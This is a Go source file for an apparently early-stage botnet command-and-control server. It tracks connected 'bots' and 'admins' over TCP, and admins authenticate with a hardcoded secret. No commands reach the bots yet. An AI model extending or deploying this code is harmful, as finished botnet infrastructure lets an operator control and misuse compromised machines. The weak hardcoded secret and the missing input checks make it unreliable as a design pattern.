package main

import (
	"fmt"
	"net"
	"os"
	"strings"
	"sync"
)

const SECRET = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"

var (
	bots   = make(map[net.Conn]bool) // Map to store connected clients
	botMux sync.Mutex
	// Mutex to synchronize access to the clients map
	admins          = make(map[net.Conn]bool)
	adminMux        sync.Mutex
	broadcast       = make(chan string) // Channel for broadcasting messages
	receivedCommand = make(chan string)
)

func manageDB(clientType string, action bool, conn net.Conn) {
	//true = se agrega; false = se elimina
	switch clientType {
	case "admin":
		if action {
			adminMux.Lock()
			admins[conn] = true
			adminMux.Unlock()
			fmt.Println("admin Connected")
		} else {
			adminMux.Lock()
			delete(admins, conn)
			adminMux.Unlock()
			fmt.Println("admin disconnected:")
		}
	case "bot":
		if action {
			botMux.Lock()
			bots[conn] = true
			botMux.Unlock()
			fmt.Println("bot Connected")
		} else {
			botMux.Lock()
			delete(bots, conn)
			botMux.Unlock()
			fmt.Println("bot disconnected:")
		}

	}
}

func handleConnection(conn net.Conn, broadcast chan<- string) {
	defer conn.Close()

	buffer := make([]byte, 1024)
	n, err := conn.Read(buffer)

	if err != nil {
		fmt.Println("Error reading:", err)
		return
	}
	receivedData := string(buffer[:n])
	credentials := strings.Split(receivedData, "/")

	clientType := credentials[0]

	if clientType == "admin" {
		clientSecret := credentials[1]

		if clientSecret != SECRET {
			fmt.Println("Invalid Secret")
			return
		}
	}

	manageDB(clientType, true, conn)
	for {
		buffer := make([]byte, 1024)
		n, err = conn.Read(buffer)
		receivedData := string(buffer[:n])

		if err != nil {
			manageDB(clientType, false, conn)
			return
		}

		switch clientType {
		case "admin":
			//fmt.Printf(receivedData)
			switch receivedData {
			case "show":
				fmt.Println("Show # of bots")
			}
		case "bot":

		}
		//fmt.Println(buffer)
	}

}

func main() {
	port := "8080"
	listener, err := net.Listen("tcp", ":"+port) //Starts listening in port

	if err != nil { //If error exits
		fmt.Println("Error:", err)
		os.Exit(1)
	}
	defer listener.Close()

	fmt.Println("Server listening on port", port)

	for {
		conn, err := listener.Accept()
		if err != nil {
			fmt.Println("Error accepting connection:", err)
			continue
		}
		go handleConnection(conn, broadcast) // Handle the connection concurrently in a goroutine
	}
}
